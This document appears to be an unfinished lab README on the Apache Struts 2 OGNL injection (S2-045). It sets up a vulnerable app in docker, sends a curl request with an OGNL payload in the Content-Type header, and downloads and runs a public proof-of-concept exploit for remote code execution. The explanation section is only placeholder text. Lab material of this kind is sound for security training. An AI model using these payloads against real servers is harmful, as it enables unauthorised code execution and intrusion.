# 5. Apache Struts 2 OGNL Injection
## Subtitle / what it does

### Run in docker:
```
cd 5-apache-struts-2
docker-compose up -d
```

### Exploit:
```
curl -XPOST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080
![image](https://user-images.githubusercontent.com/31791455/140392000-8494ff8f-6a97-44b1-a3a6-7405971e8ab7.png)

```
### Proxy curl via Burp:
```
curl -XPOST --proxy http://127.0.0.1:8080 -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080
![image](https://user-images.githubusercontent.com/31791455/140391963-fa980891-aa93-47fe-9a5e-1b2b4d8677fb.png)

```

![image](https://user-images.githubusercontent.com/31791455/140393499-ab5e5463-ea74-46c0-a746-c8457c23f773.png)


### Code execution:
The exploit requires unlocking some OGNL features before you can pass from simple code evaluation to full RCE.
Ready to use exploit can be found here: 
```
wget https://raw.githubusercontent.com/Medicean/VulApps/master/s/struts2/s2-045/poc.py
chmod +x ./poc.py
python2 poc.py "http://127.0.0.1:8080" "id"
```

![image](https://user-images.githubusercontent.com/31791455/140393300-96dba119-0002-4c2a-af5b-0a1704484a0a.png)


### Explanation
This happens costam

### References and recommended reading


### Credits:
https://github.com/vulhub/vulhub/tree/4d17ab2d4df39eefad5c498c5aa60b036a05494d/struts2/s2-045
![image](https://user-images.githubusercontent.com/31791455/140391845-7a4dd0c9-aa81-4449-b9cf-d310ed8b3ee9.png)
